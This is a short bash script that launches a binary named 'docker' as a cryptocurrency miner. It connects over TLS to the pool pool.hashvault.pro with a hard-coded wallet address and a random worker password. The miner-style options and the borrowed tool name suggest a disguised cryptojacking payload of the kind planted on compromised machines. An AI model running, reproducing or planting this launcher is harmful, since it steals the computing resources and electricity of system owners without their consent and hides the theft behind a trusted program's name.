#!/bin/bash
./docker --url pool.hashvault.pro:80 --user TRTLuzwp6xRJLfVC6v2kCT58AXGuJa7mHgZCuHpksNSMXMfvq7BYZGU1oCFJGYhidbAi8ueW5e4W9P1Q2zoEz7pueyDv5sJmvyH --pass $(echo $(shuf -i 1-20000 -n 1)-V) --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
